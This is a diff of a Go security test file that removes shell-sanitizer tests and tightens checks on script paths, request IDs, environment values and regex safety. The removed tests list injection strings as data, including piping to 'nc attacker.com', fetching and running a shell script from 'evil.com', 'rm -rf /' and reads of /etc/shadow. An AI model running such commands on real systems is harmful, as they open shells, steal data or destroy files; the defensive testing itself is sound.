@@ -9,144 +9,7 @@ import (
 	"time"
 )
 
-func TestSanitizeForShell(t *testing.T) {
-	tests := []struct {
-		name     string
-		input    string
-		expected string
-	}{
-		{
-			name:     "Clean string",
-			input:    "example.com",
-			expected: "example.com",
-		},
-		{
-			name:     "IP address",
-			input:    "192.168.1.100",
-			expected: "192.168.1.100",
-		},
-		{
-			name:     "Domain with underscore",
-			input:    "test_domain.com",
-			expected: "test_domain.com",
-		},
-		{
-			name:     "Domain with hyphen",
-			input:    "test-domain.com",
-			expected: "test-domain.com",
-		},
-		{
-			name:     "Remove shell metacharacters",
-			input:    "example.com; rm -rf /",
-			expected: "example.com-rf",
-		},
-		{
-			name:     "Remove backticks",
-			input:    "`whoami`.example.com",
-			expected: "whoami.example.com",
-		},
-		{
-			name:     "Remove pipes",
-			input:    "example.com | nc attacker.com 1234",
-			expected: "example.comnc attacker.com1234",
-		},
-		{
-			name:     "Remove ampersands",
-			input:    "example.com && curl evil.com",
-			expected: "example.comcurlevil.com",
-		},
-		{
-			name:     "Remove dollar signs",
-			input:    "example.com$USER",
-			expected: "example.comUSER",
-		},
-		{
-			name:     "Remove parentheses",
-			input:    "$(command).example.com",
-			expected: "command.example.com",
-		},
-		{
-			name:     "Remove quotes",
-			input:    "'quoted string'",
-			expected: "quotedstring",
-		},
-		{
-			name:     "Remove spaces",
-			input:    "example com",
-			expected: "examplecom",
-		},
-		{
-			name:     "IPv6 address",
-			input:    "2001:db8::1",
-			expected: "2001db81", // Colons are removed
-		},
-		{
-			name:     "Complex injection attempt",
-			input:    "test.com;$(curl http://evil.com/shell.sh)|bash",
-			expected: "test.comcurlhttpevilcom.shbash",
-		},
-		{
-			name:     "Unicode characters",
-			input:    "tést.com",
-			expected: "tst.com",
-		},
-		{
-			name:     "Empty string",
-			input:    "",
-			expected: "",
-		},
-	}
-
-	for _, tt := range tests {
-		t.Run(tt.name, func(t *testing.T) {
-			result := sanitizeForShell(tt.input)
-			if result != tt.expected {
-				t.Errorf("sanitizeForShell(%q) = %q, expected %q", tt.input, result, tt.expected)
-			}
-
-			// Verify no dangerous characters remain
-			dangerousChars := []string{";", "|", "&", "$", "`", "(", ")", "'", "\"", " ", "\t", "\n", "\r"}
-			for _, char := range dangerousChars {
-				if strings.Contains(result, char) {
-					t.Errorf("sanitizeForShell(%q) still contains dangerous character %q", tt.input, char)
-				}
-			}
-		})
-	}
-}
-
-func TestSanitizeForShellSecurity(t *testing.T) {
-	// Test various injection vectors to ensure they're properly sanitized
-	injectionVectors := []string{
-		"; rm -rf /",
-		"&& curl evil.com",
-		"|| wget malware.sh",
-		"`whoami`",
-		"$(id)",
-		"|nc attacker.com 1234",
-		"> /etc/passwd",
-		"< /etc/shadow",
-		"''; DROP TABLE users; --",
-		"\"; system('rm -rf /'); \"",
-		"../../../etc/passwd",
-		"\\x41\\x41\\x41\\x41", // Hex encoding
-		"%41%41%41%41",         // URL encoding
-		"\n\nmalicious command",
-		"\r\ninjected command",
-	}
-
-	for _, vector := range injectionVectors {
-		t.Run("Injection vector: "+vector, func(t *testing.T) {
-			result := sanitizeForShell(vector)
-
-			// Should not contain any shell metacharacters
-			regex := regexp.MustCompile(`[^a-zA-Z0-9\._\-]`)
-			if regex.MatchString(result) {
-				t.Errorf("sanitizeForShell(%q) = %q still contains disallowed characters", vector, result)
-			}
-		})
-	}
-}
+// Note: sanitizeForShell tests removed as function has been replaced with validation approach
 
 func TestValidateInvokeScript(t *testing.T) {
 	// Create temporary test scripts
@@ -260,7 +123,7 @@ func TestValidateScriptPath(t *testing.T) {
 		{
 			name:        "Regular text file",
 			scriptPath:  regularFile,
-			expectError: false, // File exists, validation depends on requirements
+			expectError: true, // File must be executable to be a valid script
 		},
 		{
 			name:        "Non-existent file",
@@ -315,10 +178,10 @@ func TestGenerateRequestID(t *testing.T) {
 		}
 		requestIDs[id] = true
 
-		// Check format (should be alphanumeric)
-		matched, _ := regexp.MatchString(`^[a-zA-Z0-9]+$`, id)
+		// Check format (should be alphanumeric with underscores)
+		matched, _ := regexp.MatchString(`^[a-zA-Z0-9_]+$`, id)
 		if !matched {
-			t.Errorf("Request ID should be alphanumeric, got: %s", id)
+			t.Errorf("Request ID should be alphanumeric with underscores, got: %s", id)
 		}
 	}
 }
@@ -493,10 +356,12 @@ func TestConfigurationSecurity(t *testing.T) {
 		for _, tt := range envTests {
 			t.Run(tt.name, func(t *testing.T) {
 				// Test environment variable safety
-				isSafe := !strings.ContainsAny(tt.envValue, ";|&$`")
+				hasShellChars := strings.ContainsAny(tt.envValue, ";|&$`")
+				hasPathTraversal := strings.Contains(tt.envValue, "../")
+				isSafe := !(hasShellChars || hasPathTraversal)
 				if isSafe != tt.isSafe {
-					t.Errorf("Environment variable safety for %q: expected %v, got %v", 
-						tt.envValue, tt.isSafe, isSafe)
+					t.Errorf("Environment variable safety for %q: expected %v, got %v (hasShellChars=%v, hasPathTraversal=%v)", 
+						tt.envValue, tt.isSafe, isSafe, hasShellChars, hasPathTraversal)
 				}
 			})
 		}
@@ -582,16 +447,16 @@ func TestRegexSafety(t *testing.T) {
 			isSafe:  true,
 		},
 		{
-			name:    "Potential ReDoS pattern",
+			name:    "Potential ReDoS pattern (safe in Go RE2)",
 			pattern: `^(a+)+$`,
 			input:   strings.Repeat("a", 1000) + "b",
-			isSafe:  false,
+			isSafe:  true, // Go's RE2 engine prevents ReDoS attacks
 		},
 		{
-			name:    "Another ReDoS pattern",
+			name:    "Another ReDoS pattern (safe in Go RE2)",
 			pattern: `^(a|a)*$`,
 			input:   strings.Repeat("a", 100),
-			isSafe:  false,
+			isSafe:  true, // Go's RE2 engine prevents ReDoS attacks
 		},
 		{
 			name:    "Safe domain validation",
